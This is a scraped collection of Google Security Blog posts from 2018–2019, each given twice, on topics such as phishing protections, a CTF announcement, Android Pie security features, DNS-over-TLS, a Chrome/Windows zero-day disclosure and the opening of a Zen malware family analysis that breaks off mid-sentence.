{"website": "Google-Security", "title": "\nBetter protection against Man in the Middle phishing attacks\n", "author": ["Posted by Jonathan Skelker, Product Manager, Account Security"], "link": "https://security.googleblog.com/2019/04/better-protection-against-man-in-middle.html", "abstract": "                             Posted by Jonathan Skelker, Product Manager, Account Security     We&#8217;re constantly working to improve our phishing protections to keep your information secure. Last year, we announced that we would require  JavaScript to be enabled  in your browser when you sign in so that we can run a risk assessment whenever credentials are entered on a sign-in page and block the sign-in if we suspect an attack. This is yet another layer of protection on top of existing safeguards like  Safe Browsing warnings ,  Gmail spam filters , and  account sign-in challenges .    However, one form of phishing, known as &#8220; man in the middle &#8221; (MITM), is hard to detect when an embedded browser framework (e.g.,  Chromium Embedded Framework  - CEF) or another automation platform is being used for authentication. MITM intercepts the communications between a user and Google in real-time to gather the user&#8217;s credentials (including the second factor in some cases) and sign in. Because we can&#8217;t differentiate between a legitimate sign in and a MITM attack on these platforms, we will be blocking sign-ins from embedded browser frameworks starting in June. This is similar to the  restriction on webview  sign-ins announced in April 2016.     What developers need to know       The solution for developers currently using CEF for authentication is the same:&nbsp; browser-based OAuth authentication . Aside from being secure, it also enables users to see the full URL of the page where they are entering their credentials, reinforcing good anti-phishing practices. If you are a developer with an app that requires access to Google Account data, switch to using browser-based OAuth authentication today.                                   Posted by Jonathan Skelker, Product Manager, Account Security  We’re constantly working to improve our phishing protections to keep your information secure. Last year, we announced that we would require JavaScript to be enabled in your browser when you sign in so that we can run a risk assessment whenever credentials are entered on a sign-in page and block the sign-in if we suspect an attack. This is yet another layer of protection on top of existing safeguards like Safe Browsing warnings, Gmail spam filters, and account sign-in challenges.  However, one form of phishing, known as “man in the middle” (MITM), is hard to detect when an embedded browser framework (e.g., Chromium Embedded Framework - CEF) or another automation platform is being used for authentication. MITM intercepts the communications between a user and Google in real-time to gather the user’s credentials (including the second factor in some cases) and sign in. Because we can’t differentiate between a legitimate sign in and a MITM attack on these platforms, we will be blocking sign-ins from embedded browser frameworks starting in June. This is similar to the restriction on webview sign-ins announced in April 2016.  What developers need to know  The solution for developers currently using CEF for authentication is the same: browser-based OAuth authentication. Aside from being secure, it also enables users to see the full URL of the page where they are entering their credentials, reinforcing good anti-phishing practices. If you are a developer with an app that requires access to Google Account data, switch to using browser-based OAuth authentication today.     ", "date": "April 18, 2019"},
{"website": "Google-Security", "title": "\nGoogle CTF 2019 is here\n", "author": ["Posted by Jan Keller, Security Technical Program Manager"], "link": "https://security.googleblog.com/2019/05/google-ctf-2019-is-here.html", "abstract": "                             Posted by Jan Keller, Security Technical Program Manager     June has become the month where we&#8217;re inviting thousands of security aficionados to put their skills to the test...    In 2018, 23,563 people submitted at least one flag on their hunt for the secret cake recipe in the Beginner&#8217;s Quest. While 330 teams competed for a place in the CTF Finals, the lucky 10 winning teams got a trip to London to play with fancy tools,  solve mysterious videos  and dine in Churchill&#8217;s old chambers.    This June, we will be hosting our fourth-annual Capture the Flag event. Teams of security researchers will again come together from all over the globe for one weekend to eat, sleep and breathe security puzzles and challenges - some of them working together around the clock to solve some of the toughest security challenges on the planet.    Up for grabs this year is $31,337.00 in prize money and the title of Google CTF Champion.    Ready? Here are the details:         The qualification round will take place online Sat/Sun June 22 and 23 2019   The top 10 teams will qualify for the onsite final (location and details coming soon)   Players from the Beginner's Quest can enter the draw for 10 tickets to witness the Google CTF finals      Whether you&#8217;re a seasoned CTF player or just curious about cyber security and ethical hacking, we want you to join us. If you&#8217;re just starting out, the &#8220;Beginner's Quest&#8221; is perfect for you. Sign up to learn skills, meet new friends in the security community and even watch the pros in action. See you there! For the latest announcements, see  g.co/ctf ,  subscribe to our mailing list  or follow us on  @GoogleVRP .                                                     Posted by Jan Keller, Security Technical Program Manager  June has become the month where we’re inviting thousands of security aficionados to put their skills to the test...  In 2018, 23,563 people submitted at least one flag on their hunt for the secret cake recipe in the Beginner’s Quest. While 330 teams competed for a place in the CTF Finals, the lucky 10 winning teams got a trip to London to play with fancy tools, solve mysterious videos and dine in Churchill’s old chambers.  This June, we will be hosting our fourth-annual Capture the Flag event. Teams of security researchers will again come together from all over the globe for one weekend to eat, sleep and breathe security puzzles and challenges - some of them working together around the clock to solve some of the toughest security challenges on the planet.  Up for grabs this year is $31,337.00 in prize money and the title of Google CTF Champion.  Ready? Here are the details:    The qualification round will take place online Sat/Sun June 22 and 23 2019 The top 10 teams will qualify for the onsite final (location and details coming soon) Players from the Beginner's Quest can enter the draw for 10 tickets to witness the Google CTF finals   Whether you’re a seasoned CTF player or just curious about cyber security and ethical hacking, we want you to join us. If you’re just starting out, the “Beginner's Quest” is perfect for you. Sign up to learn skills, meet new friends in the security community and even watch the pros in action. See you there! For the latest announcements, see g.co/ctf, subscribe to our mailing list or follow us on @GoogleVRP.           ", "date": "May 3, 2019"},
{"website": "Google-Security", "title": "\nQuantifying Measurable Security\n", "author": ["Posted by Eugene Liderman, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/05/quantifying-measurable-security.html", "abstract": "                             Posted by Eugene Liderman, Android Security &amp; Privacy Team            With  Google I/O  this week you are going to hear about a lot of new features in Android that are coming in Q. One thing that you will also hear about is how every new Android release comes with dozens of security and privacy enhancements. We have been continually investing in our layered security approach which is also referred to as&#8220; defense-in-depth&#8221;. These defenses start with hardware-based security, moving up the stack to the Linux kernel with app sandboxing. On top of that, we provide built-in security services designed to protect against malware and phishing.    However layered security doesn&#8217;t just apply to the technology. It also applies to the people and the process. Both Android and Chrome OS have dedicated security teams who are tasked with continually enhancing the security of these operating systems through new features and anti-exploitation techniques. In addition, each team leverages a mature and comprehensive security development lifecycle process to ensure that security is always part of the process and not an afterthought.    Secure by design is not the only thing that Android and Chrome OS have in common. Both operating systems also share numerous key security concepts, including:       Heavily relying on hardware based security for things like rollback prevention and verified boot     Continued investment in anti-exploitation techniques so that a bug or vulnerability does not become exploitable     Implementing two copies of the OS in order to support seamless updates that run in the background and notify the user when the device is ready to boot the new version     Splitting up feature and security updates and providing a frequent cadence of security updates     Providing built-in anti-malware and anti-phishing solutions through  Google Play Protect  and  Google Safe Browsing      On the Android Security &amp; Privacy team we&#8217;re always trying to find ways to assess our ongoing security investments; we often refer to this as measurable security. One way we measure our ongoing investments is through third party analyst research such as  Gartner&#8217;s May 2019 Mobile OSs and Device Security: A Comparison of Platforms  report (subscription required). For those not familiar with this report, it&#8217;s a comprehensive comparison between &#8220;the core OS security features that are built into various mobile device platforms, as well as enterprise management capabilities.&#8221; In this year&#8217;s report, Gartner provides &#8220;a comparison of the out-of-the-box controls under the category &#8220;Built-In Security&#8221;. In the second part, called &#8220;Corporate-Managed Security, [Gartner] compares the enterprise management controls available for the latest versions of the major mobile device platforms&#8221;. Here is how our operating systems and devices ranked:      Android 9 (Pie) scored &#8220;strong&#8221; in 26 out of 30 categories     Pixel 3 with  Titan M  received &#8220;strong&#8221; ratings in 27 of the 30 categories, and had the most &#8220;strong&#8221; ratings in the built-in security section out of all devices evaluated (15 out of 17)      Chrome OS  was added in this year's report and received strong ratings in 27 of the 30 categories.     Check out the video of Patrick Hevesi, who was the lead analyst on the report, introducing the 2019 report, the methodology and what went into this year's criteria.         You can see a breakdown of all of the categories in the table below:              Take a look at all of the great security and privacy enhancements that came in Pie by reading  Android Pie à la mode: Security &amp; Privacy . Also be sure to live stream our Android Q security update at  Google IO  titled:  Security on Android: What's Next  on Thursday at 8:30am Pacific Time.                                    Posted by Eugene Liderman, Android Security & Privacy Team     With Google I/O this week you are going to hear about a lot of new features in Android that are coming in Q. One thing that you will also hear about is how every new Android release comes with dozens of security and privacy enhancements. We have been continually investing in our layered security approach which is also referred to as“ defense-in-depth”. These defenses start with hardware-based security, moving up the stack to the Linux kernel with app sandboxing. On top of that, we provide built-in security services designed to protect against malware and phishing.   However layered security doesn’t just apply to the technology. It also applies to the people and the process. Both Android and Chrome OS have dedicated security teams who are tasked with continually enhancing the security of these operating systems through new features and anti-exploitation techniques. In addition, each team leverages a mature and comprehensive security development lifecycle process to ensure that security is always part of the process and not an afterthought.   Secure by design is not the only thing that Android and Chrome OS have in common. Both operating systems also share numerous key security concepts, including:    Heavily relying on hardware based security for things like rollback prevention and verified boot   Continued investment in anti-exploitation techniques so that a bug or vulnerability does not become exploitable   Implementing two copies of the OS in order to support seamless updates that run in the background and notify the user when the device is ready to boot the new version   Splitting up feature and security updates and providing a frequent cadence of security updates   Providing built-in anti-malware and anti-phishing solutions through Google Play Protect and Google Safe Browsing   On the Android Security & Privacy team we’re always trying to find ways to assess our ongoing security investments; we often refer to this as measurable security. One way we measure our ongoing investments is through third party analyst research such as Gartner’s May 2019 Mobile OSs and Device Security: A Comparison of Platforms report (subscription required). For those not familiar with this report, it’s a comprehensive comparison between “the core OS security features that are built into various mobile device platforms, as well as enterprise management capabilities.” In this year’s report, Gartner provides “a comparison of the out-of-the-box controls under the category “Built-In Security”. In the second part, called “Corporate-Managed Security, [Gartner] compares the enterprise management controls available for the latest versions of the major mobile device platforms”. Here is how our operating systems and devices ranked:   Android 9 (Pie) scored “strong” in 26 out of 30 categories   Pixel 3 with Titan M received “strong” ratings in 27 of the 30 categories, and had the most “strong” ratings in the built-in security section out of all devices evaluated (15 out of 17)   Chrome OS was added in this year's report and received strong ratings in 27 of the 30 categories.   Check out the video of Patrick Hevesi, who was the lead analyst on the report, introducing the 2019 report, the methodology and what went into this year's criteria.     You can see a breakdown of all of the categories in the table below:      Take a look at all of the great security and privacy enhancements that came in Pie by reading Android Pie à la mode: Security & Privacy. Also be sure to live stream our Android Q security update at Google IO titled: Security on Android: What's Next on Thursday at 8:30am Pacific Time.     ", "date": "May 8, 2019"},
{"website": "Google-Security", "title": "\nAndroid Security Improvement update: Helping developers harden their apps, one thwarted vulnerability at a time\n", "author": [], "link": "https://security.googleblog.com/2019/02/android-security-improvement-update.html", "abstract": "                                   Posted by Patrick Mutchler and  Meghan Kelly , Android Security & Privacy Team      [Cross-posted from the  Android Developers Blog ]     Helping Android app developers build secure apps, free of known vulnerabilities, means helping the overall ecosystem thrive. This is why we launched the  Application Security Improvement Program  five years ago, and why we're still so invested in its success today.     What the Android Security Improvement Program does      When an app is submitted to the Google Play store, we scan it to determine if a variety of vulnerabilities are present. If we find something concerning, we flag it to the developer and then help them to remedy the situation.          Think of it like a routine physical. If there are no problems, the app runs through our normal tests and continues on the process to being published in the Play Store. If there is a problem, however, we provide a diagnosis and next steps to get back to healthy form.      Over its lifetime, the program has helped more than 300,000 developers to fix more than 1,000,000 apps on Google Play. In 2018 alone, the program helped over 30,000 developers fix over 75,000 apps. The downstream effect means that those 75,000 vulnerable apps are not distributed to users with the same security issues present, which we consider a win.      What vulnerabilities are covered        The App Security Improvement program covers a broad range of security issues in Android apps. These can be as specific as security issues in certain versions of popular libraries ( ex: CVE-2015-5256 ) and as broad as  unsafe TLS/SSL certificate validation .      We are continuously improving this program's capabilities by improving the existing checks and launching checks for more classes of security vulnerability. In 2018, we deployed warnings for six additional security vulnerability classes including:      SQL Injection  File-based Cross-Site Scripting  Cross-App Scripting  Leaked Third-Party Credentials  Scheme Hijacking  JavaScript Interface Injection      Ensuring that we're continuing to evolve the program as new exploits emerge is a top priority for us. We are continuing to work on this throughout 2019.     Keeping Android users safe is important to Google. We know that app security is often tricky and that developers can make mistakes. We hope to see this program grow in the years to come, helping developers worldwide build apps users can truly trust.                                          Posted by Patrick Mutchler and Meghan Kelly, Android Security & Privacy Team  [Cross-posted from the Android Developers Blog]  Helping Android app developers build secure apps, free of known vulnerabilities, means helping the overall ecosystem thrive. This is why we launched the Application Security Improvement Program five years ago, and why we're still so invested in its success today.   What the Android Security Improvement Program does    When an app is submitted to the Google Play store, we scan it to determine if a variety of vulnerabilities are present. If we find something concerning, we flag it to the developer and then help them to remedy the situation.     Think of it like a routine physical. If there are no problems, the app runs through our normal tests and continues on the process to being published in the Play Store. If there is a problem, however, we provide a diagnosis and next steps to get back to healthy form.    Over its lifetime, the program has helped more than 300,000 developers to fix more than 1,000,000 apps on Google Play. In 2018 alone, the program helped over 30,000 developers fix over 75,000 apps. The downstream effect means that those 75,000 vulnerable apps are not distributed to users with the same security issues present, which we consider a win.   What vulnerabilities are covered     The App Security Improvement program covers a broad range of security issues in Android apps. These can be as specific as security issues in certain versions of popular libraries (ex: CVE-2015-5256) and as broad as unsafe TLS/SSL certificate validation.    We are continuously improving this program's capabilities by improving the existing checks and launching checks for more classes of security vulnerability. In 2018, we deployed warnings for six additional security vulnerability classes including:   SQL Injection File-based Cross-Site Scripting Cross-App Scripting Leaked Third-Party Credentials Scheme Hijacking JavaScript Interface Injection   Ensuring that we're continuing to evolve the program as new exploits emerge is a top priority for us. We are continuing to work on this throughout 2019.   Keeping Android users safe is important to Google. We know that app security is often tricky and that developers can make mistakes. We hope to see this program grow in the years to come, helping developers worldwide build apps users can truly trust.       ", "date": "February 28, 2019"},
{"website": "Google-Security", "title": "\nDisclosing vulnerabilities to protect users across platforms\n", "author": ["Posted by Clement Lecigne, Threat Analysis Group"], "link": "https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html", "abstract": "                             Posted by Clement Lecigne, Threat Analysis Group     On Wednesday, February 27th, we reported two 0-day vulnerabilities &#8212; previously publicly-unknown vulnerabilities &#8212; one affecting Google Chrome and another in Microsoft Windows that were being exploited together.    To remediate the Chrome vulnerability (CVE-2019-5786), Google released an update for all Chrome platforms on March 1; this  update  was pushed through Chrome auto-update. We encourage users to verify that Chrome auto-update has already  updated Chrome  to 72.0.3626.121 or later.    The second vulnerability was in Microsoft Windows. It is a local privilege escalation in the Windows win32k.sys kernel driver that can be used as a security sandbox escape. The vulnerability is a NULL pointer dereference in  win32k!MNGetpItemFromIndex  when  NtUserMNDragOver()  system call is called under specific circumstances.    We strongly believe this vulnerability may only be exploitable on Windows 7 due to recent exploit mitigations added in newer versions of Windows. To date, we have only observed active exploitation against Windows 7 32-bit systems.    Pursuant to Google&#8217;s  vulnerability disclosure policy , when we discovered the vulnerability we reported it to Microsoft. Today, also in compliance with our policy, we are publicly disclosing its existence, because it is a serious vulnerability in Windows that we know was being actively exploited in targeted attacks. The unpatched Windows vulnerability can still be used to elevate privileges or combined with another browser vulnerability to evade security sandboxes. Microsoft have told us they are working on a fix.    As mitigation advice for this vulnerability users should consider upgrading to Windows 10 if they are still running an older version of Windows, and to apply Windows patches from Microsoft when they become available. We will update this post when they are available.                                   Posted by Clement Lecigne, Threat Analysis Group  On Wednesday, February 27th, we reported two 0-day vulnerabilities — previously publicly-unknown vulnerabilities — one affecting Google Chrome and another in Microsoft Windows that were being exploited together.  To remediate the Chrome vulnerability (CVE-2019-5786), Google released an update for all Chrome platforms on March 1; this update was pushed through Chrome auto-update. We encourage users to verify that Chrome auto-update has already updated Chrome to 72.0.3626.121 or later.  The second vulnerability was in Microsoft Windows. It is a local privilege escalation in the Windows win32k.sys kernel driver that can be used as a security sandbox escape. The vulnerability is a NULL pointer dereference in win32k!MNGetpItemFromIndex when NtUserMNDragOver() system call is called under specific circumstances.  We strongly believe this vulnerability may only be exploitable on Windows 7 due to recent exploit mitigations added in newer versions of Windows. To date, we have only observed active exploitation against Windows 7 32-bit systems.  Pursuant to Google’s vulnerability disclosure policy, when we discovered the vulnerability we reported it to Microsoft. Today, also in compliance with our policy, we are publicly disclosing its existence, because it is a serious vulnerability in Windows that we know was being actively exploited in targeted attacks. The unpatched Windows vulnerability can still be used to elevate privileges or combined with another browser vulnerability to evade security sandboxes. Microsoft have told us they are working on a fix.  As mitigation advice for this vulnerability users should consider upgrading to Windows 10 if they are still running an older version of Windows, and to apply Windows patches from Microsoft when they become available. We will update this post when they are available.     ", "date": "March 7, 2019"},
{"website": "Google-Security", "title": "\nAndroid Pie à la mode: Security & Privacy\n", "author": [], "link": "https://security.googleblog.com/2018/12/android-pie-la-mode-security-privacy.html", "abstract": "                            Posted by Vikrant Nanda and René Mayrhofer, Android Security &amp; Privacy Team     [Cross-posted from the  Android Developers Blog ]           There is no better time to talk about Android dessert releases than the holidays because who doesn't love dessert? And what is one of our favorite desserts during the holiday season? Well, pie of course.    In all seriousness, pie is a great analogy because of how the various ingredients turn into multiple layers of goodness: right from the software crust on top to the hardware layer at the bottom. Read on for a summary of security and privacy features introduced in Android Pie this year.   Platform hardening   With Android Pie, we updated  File-Based Encryption  to support external storage media (such as, expandable storage cards). We also introduced support for  metadata encryption  where hardware support is present. With filesystem metadata encryption, a single key present at boot time encrypts whatever content is not encrypted by file-based encryption (such as, directory layouts, file sizes, permissions, and creation/modification times).    Android Pie also introduced a  BiometricPrompt API  that apps can use to provide biometric authentication dialogs (such as, fingerprint prompt) on a device in a modality-agnostic fashion. This functionality creates a standardized look, feel, and placement for the dialog. This kind of standardization gives users more confidence that they're authenticating against a trusted biometric credential checker.    New protections and test cases for the  Application Sandbox  help ensure all non-privileged apps targeting Android Pie (and all future releases of Android) run in stronger  SELinux  sandboxes. By providing per-app cryptographic authentication to the sandbox, this protection improves app separation, prevents overriding safe defaults, and (most significantly) prevents apps from making their data widely accessible.   Anti-exploitation improvements   With Android Pie, we expanded our  compiler-based security mitigations , which instrument runtime operations to fail safely when undefined behavior occurs.     Control Flow Integrity (CFI)  is a security mechanism that disallows changes to the original control flow graph of compiled code. In Android Pie, it has been enabled by default within the media frameworks and other security-critical components, such as for Near Field Communication (NFC) and Bluetooth protocols. We also implemented support for  CFI in the Android common kernel , continuing our efforts to harden the kernel in previous Android releases.     Integer Overflow Sanitization  is a security technique used to mitigate memory corruption and information disclosure vulnerabilities caused by integer operations. We've expanded our use of Integer Overflow sanitizers by enabling their use in libraries where complex untrusted input is processed or where security vulnerabilities have been reported.   Continued investment in hardware-backed security     One of the highlights of Android Pie is  Android Protected Confirmation , the first major mobile OS API that leverages a hardware-protected user interface (Trusted UI) to perform critical transactions completely outside the main mobile operating system. Developers can use this API to display a trusted UI prompt to the user, requesting approval via a physical protected input (such as, a button on the device). The resulting cryptographically signed statement allows the relying party to reaffirm that the user would like to complete a sensitive transaction through their app.    We also introduced support for a new Keystore type that provides stronger protection for private keys by leveraging tamper-resistant hardware with dedicated CPU, RAM, and flash memory.  StrongBox Keymaster  is an implementation of the Keymaster hardware abstraction layer (HAL) that resides in a hardware security module. This module is designed and required to have its own processor, secure storage, True Random Number Generator (TRNG), side-channel resistance, and tamper-resistant packaging.    Other Keystore features (as part of Keymaster 4) include Keyguard-bound keys, Secure Key Import, 3DES support, and version binding. Keyguard-bound keys enable use restriction so as to protect sensitive information. Secure Key Import facilitates secure key use while protecting key material from the application or operating system. You can read more about these features in our recent  blog post  as well as the accompanying  release notes .   Enhancing user privacy     User privacy has been boosted with several  behavior changes , such as limiting the access background apps have to the camera, microphone, and device sensors. New permission rules and permission groups have been created for phone calls, phone state, and Wi-Fi scans, as well as restrictions around information retrieved from Wi-Fi scans. We have also added associated  MAC address randomization , so that a device can use a different network address when connecting to a Wi-Fi network.    On top of that, Android Pie added support for encrypting Android backups with the user's screen lock secret (that is, PIN, pattern, or password). By design, this means that  an attacker would not be able to access a user's backed-up application data  without specifically knowing their passcode. Auto backup for apps has been enhanced by providing developers a way to specify conditions under which their app's data is excluded from auto backup. For example, Android Pie introduces a new flag to determine whether a user's backup is client-side encrypted.    As part of a larger effort to move all web traffic away from cleartext (unencrypted HTTP) and towards being secured with TLS (HTTPS), we changed the defaults for Network Security Configuration to block all cleartext traffic. We're protecting users with  TLS by default , unless you explicitly opt-in to cleartext for specific domains. Android Pie also adds built-in support for  DNS over TLS , automatically upgrading DNS queries to TLS if a network's DNS server supports it. This protects information about IP addresses visited from being sniffed or intercepted on the network level.      We believe that the features described in this post advance the security and privacy posture of Android, but you don't have to take our word for it. Year after year our continued efforts are demonstrably resulting in better protection as evidenced by  increasing exploit difficulty  and  independent mobile security ratings . Now go and enjoy some actual pie while we get back to preparing the next Android dessert release!    Making Android more secure requires a combination of hardening the platform and advancing anti-exploitation techniques.         Acknowledgements: This post leveraged contributions from Chad Brubaker, Janis Danisevskis, Giles Hogben, Troy Kensinger, Ivan Lozano, Vishwath Mohan, Frank Salim, Sami Tolvanen, Lilian Young, and Shawn Willden.                                     Posted by Vikrant Nanda and René Mayrhofer, Android Security & Privacy Team  [Cross-posted from the Android Developers Blog]    There is no better time to talk about Android dessert releases than the holidays because who doesn't love dessert? And what is one of our favorite desserts during the holiday season? Well, pie of course.  In all seriousness, pie is a great analogy because of how the various ingredients turn into multiple layers of goodness: right from the software crust on top to the hardware layer at the bottom. Read on for a summary of security and privacy features introduced in Android Pie this year. Platform hardening With Android Pie, we updated File-Based Encryption to support external storage media (such as, expandable storage cards). We also introduced support for metadata encryption where hardware support is present. With filesystem metadata encryption, a single key present at boot time encrypts whatever content is not encrypted by file-based encryption (such as, directory layouts, file sizes, permissions, and creation/modification times).  Android Pie also introduced a BiometricPrompt API that apps can use to provide biometric authentication dialogs (such as, fingerprint prompt) on a device in a modality-agnostic fashion. This functionality creates a standardized look, feel, and placement for the dialog. This kind of standardization gives users more confidence that they're authenticating against a trusted biometric credential checker.  New protections and test cases for the Application Sandbox help ensure all non-privileged apps targeting Android Pie (and all future releases of Android) run in stronger SELinux sandboxes. By providing per-app cryptographic authentication to the sandbox, this protection improves app separation, prevents overriding safe defaults, and (most significantly) prevents apps from making their data widely accessible. Anti-exploitation improvements With Android Pie, we expanded our compiler-based security mitigations, which instrument runtime operations to fail safely when undefined behavior occurs.  Control Flow Integrity (CFI) is a security mechanism that disallows changes to the original control flow graph of compiled code. In Android Pie, it has been enabled by default within the media frameworks and other security-critical components, such as for Near Field Communication (NFC) and Bluetooth protocols. We also implemented support for CFI in the Android common kernel, continuing our efforts to harden the kernel in previous Android releases.  Integer Overflow Sanitization is a security technique used to mitigate memory corruption and information disclosure vulnerabilities caused by integer operations. We've expanded our use of Integer Overflow sanitizers by enabling their use in libraries where complex untrusted input is processed or where security vulnerabilities have been reported. Continued investment in hardware-backed security  One of the highlights of Android Pie is Android Protected Confirmation, the first major mobile OS API that leverages a hardware-protected user interface (Trusted UI) to perform critical transactions completely outside the main mobile operating system. Developers can use this API to display a trusted UI prompt to the user, requesting approval via a physical protected input (such as, a button on the device). The resulting cryptographically signed statement allows the relying party to reaffirm that the user would like to complete a sensitive transaction through their app.  We also introduced support for a new Keystore type that provides stronger protection for private keys by leveraging tamper-resistant hardware with dedicated CPU, RAM, and flash memory. StrongBox Keymaster is an implementation of the Keymaster hardware abstraction layer (HAL) that resides in a hardware security module. This module is designed and required to have its own processor, secure storage, True Random Number Generator (TRNG), side-channel resistance, and tamper-resistant packaging.  Other Keystore features (as part of Keymaster 4) include Keyguard-bound keys, Secure Key Import, 3DES support, and version binding. Keyguard-bound keys enable use restriction so as to protect sensitive information. Secure Key Import facilitates secure key use while protecting key material from the application or operating system. You can read more about these features in our recent blog post as well as the accompanying release notes. Enhancing user privacy  User privacy has been boosted with several behavior changes, such as limiting the access background apps have to the camera, microphone, and device sensors. New permission rules and permission groups have been created for phone calls, phone state, and Wi-Fi scans, as well as restrictions around information retrieved from Wi-Fi scans. We have also added associated MAC address randomization, so that a device can use a different network address when connecting to a Wi-Fi network.  On top of that, Android Pie added support for encrypting Android backups with the user's screen lock secret (that is, PIN, pattern, or password). By design, this means that an attacker would not be able to access a user's backed-up application data without specifically knowing their passcode. Auto backup for apps has been enhanced by providing developers a way to specify conditions under which their app's data is excluded from auto backup. For example, Android Pie introduces a new flag to determine whether a user's backup is client-side encrypted.  As part of a larger effort to move all web traffic away from cleartext (unencrypted HTTP) and towards being secured with TLS (HTTPS), we changed the defaults for Network Security Configuration to block all cleartext traffic. We're protecting users with TLS by default, unless you explicitly opt-in to cleartext for specific domains. Android Pie also adds built-in support for DNS over TLS, automatically upgrading DNS queries to TLS if a network's DNS server supports it. This protects information about IP addresses visited from being sniffed or intercepted on the network level.   We believe that the features described in this post advance the security and privacy posture of Android, but you don't have to take our word for it. Year after year our continued efforts are demonstrably resulting in better protection as evidenced by increasing exploit difficulty and independent mobile security ratings. Now go and enjoy some actual pie while we get back to preparing the next Android dessert release!  Making Android more secure requires a combination of hardening the platform and advancing anti-exploitation techniques.   Acknowledgements: This post leveraged contributions from Chad Brubaker, Janis Danisevskis, Giles Hogben, Troy Kensinger, Ivan Lozano, Vishwath Mohan, Frank Salim, Sami Tolvanen, Lilian Young, and Shawn Willden.      ", "date": "December 20, 2018"},
{"website": "Google-Security", "title": "\nGoogle Public DNS now supports DNS-over-TLS\n", "author": ["Posted by Marshall Vale, Product Manager and Puneet Sood, Software Engineer"], "link": "https://security.googleblog.com/2019/01/google-public-dns-now-supports-dns-over.html", "abstract": "                             Posted by Marshall Vale, Product Manager and Puneet Sood, Software Engineer     Google Public DNS is the world&#8217;s largest public Domain Name Service (DNS) recursive resolver, allowing anyone to convert Internet domain names like www.example.com into Internet addresses needed by an email application or web browser. Just as your search queries can expose sensitive information, the domains you lookup via DNS can also be sensitive. Starting today, users can secure queries between their devices and Google Public DNS with DNS-over-TLS, preserving their privacy and integrity.    The DNS environment has changed for the better since we launched Google Public DNS  over eight years ago . Back then, as today, part of Google Public DNS&#8217; mission has been to improve the security and accuracy of DNS for users all over the world. But today, there is an increased awareness of the need to protect users&#8217; communication with their DNS resolvers against forged responses and safeguard their privacy from network surveillance. The  DNS-over-TLS protocol  specifies a standard way to provide security and privacy for DNS traffic between users and their resolvers. Now users can secure their connections to Google Public DNS with  TLS , the same technology that protects their HTTPS web connections.    We implemented the DNS-over-TLS specification along with  the RFC 7766 recommendations  to minimize the overhead of using TLS. These include support for  TLS 1.3  (for faster connections and improved security), TCP fast open, and pipelining of multiple queries and out-of-order responses over a single connection. All of this is deployed with Google&#8217;s serving infrastructure which provides reliable and scalable management for DNS-over-TLS connections.     Use DNS-over-TLS today       Android 9 (Pie) device users can use DNS-over-TLS today. For configuration instructions for Android and other systems, please see the  documentation . Advanced Linux users can use the  stubby  resolver from  dnsprivacy.org  to talk to Google&#8217;s DNS-over-TLS service.    If you have a problem with Google Public DNS-over-TLS, you can  create an issue on our tracker  or ask on our  discussion group . As always, please provide as much information as possible to help us investigate the problem!                                   Posted by Marshall Vale, Product Manager and Puneet Sood, Software Engineer  Google Public DNS is the world’s largest public Domain Name Service (DNS) recursive resolver, allowing anyone to convert Internet domain names like www.example.com into Internet addresses needed by an email application or web browser. Just as your search queries can expose sensitive information, the domains you lookup via DNS can also be sensitive. Starting today, users can secure queries between their devices and Google Public DNS with DNS-over-TLS, preserving their privacy and integrity.  The DNS environment has changed for the better since we launched Google Public DNS over eight years ago. Back then, as today, part of Google Public DNS’ mission has been to improve the security and accuracy of DNS for users all over the world. But today, there is an increased awareness of the need to protect users’ communication with their DNS resolvers against forged responses and safeguard their privacy from network surveillance. The DNS-over-TLS protocol specifies a standard way to provide security and privacy for DNS traffic between users and their resolvers. Now users can secure their connections to Google Public DNS with TLS, the same technology that protects their HTTPS web connections.  We implemented the DNS-over-TLS specification along with the RFC 7766 recommendations to minimize the overhead of using TLS. These include support for TLS 1.3 (for faster connections and improved security), TCP fast open, and pipelining of multiple queries and out-of-order responses over a single connection. All of this is deployed with Google’s serving infrastructure which provides reliable and scalable management for DNS-over-TLS connections.  Use DNS-over-TLS today  Android 9 (Pie) device users can use DNS-over-TLS today. For configuration instructions for Android and other systems, please see the documentation. Advanced Linux users can use the stubby resolver from dnsprivacy.org to talk to Google’s DNS-over-TLS service.  If you have a problem with Google Public DNS-over-TLS, you can create an issue on our tracker or ask on our discussion group. As always, please provide as much information as possible to help us investigate the problem!     ", "date": "January 9, 2019"},
{"website": "Google-Security", "title": "\nPHA Family Highlights: Zen and its cousins\n", "author": [], "link": "https://security.googleblog.com/2019/01/pha-family-highlights-zen-and-its.html", "abstract": "                              table, th, td {    border: 1px solid black;           Posted by Lukasz Siewierski, Android Security &amp; Privacy Team    Google Play Protect  detects  Potentially Harmful Applications  (PHAs) which Google Play Protect defines as any mobile app that poses a potential security risk to users or to user data&#8212;commonly referred to as \"malware.\" in a variety of ways, such as static analysis, dynamic analysis, and  machine learning . While our systems are great at automatically detecting and protecting against PHAs, we believe the best security comes from the combination of automated scanning and skilled human review.   With this blog series we will be sharing our research analysis with the research and broader security community, starting with the PHA family,  Zen . Zen uses root permissions on a device to automatically enable a service that creates fake Google accounts. These accounts are created by abusing accessibility services. Zen apps gain access to root permissions from a rooting trojan in its infection chain. In this blog post, we do not differentiate between the rooting component and the component that abuses root: we refer to them interchangeably as Zen. We also describe apps that we think are coming from the same author or a group of authors. All of the PHAs that are mentioned in this blog post were detected and removed by Google Play Protect.      Background  Uncovering PHAs takes a lot of detective work and unraveling the mystery of how they're possibly connected to other apps takes even more. PHA authors usually try to hide their tracks, so attribution is difficult. Sometimes, we can attribute different apps to the same author based on a small, unique pieces of evidence that suggest similarity, such as a repetition of an exceptionally rare code snippet, asset, or a particular string in the debug logs. Every once in a while, authors leave behind a trace that allows us to attribute not only similar apps, but also multiple different PHA families to the same group or person.   However, the actual timeline of the creation of different variants is unclear. In April 2013, we saw the first sample, which made heavy use of dynamic code loading (i.e., fetching executable code from remote sources after the initial app is installed). Dynamic code loading makes it impossible to state what kind of PHA it was. This sample displayed ads from various sources. More recent variants blend rooting capabilities and click fraud. As rooting exploits on Android become less prevalent and lucrative, PHA authors adapt their abuse or monetization strategy to focus on tactics like click fraud.   This post doesn't follow the chronological evolution of Zen, but instead covers relevant samples from least to most complex.      Apps with a custom-made advertisement SDK  The simplest PHA from the author's portfolio used a specially crafted advertisement SDK to create a proxy for all ads-related network traffic. By proxying all requests through a custom server, the real source of ads is opaque. This example shows one possible implementation of this technique.         This approach allows the authors to combine ads from third-party advertising networks with ads they created for their own apps. It may even allow them to sell ad space directly to application developers. The advertisement SDK also collects statistics about clicks and impressions to make it easier to track revenue. Selling the 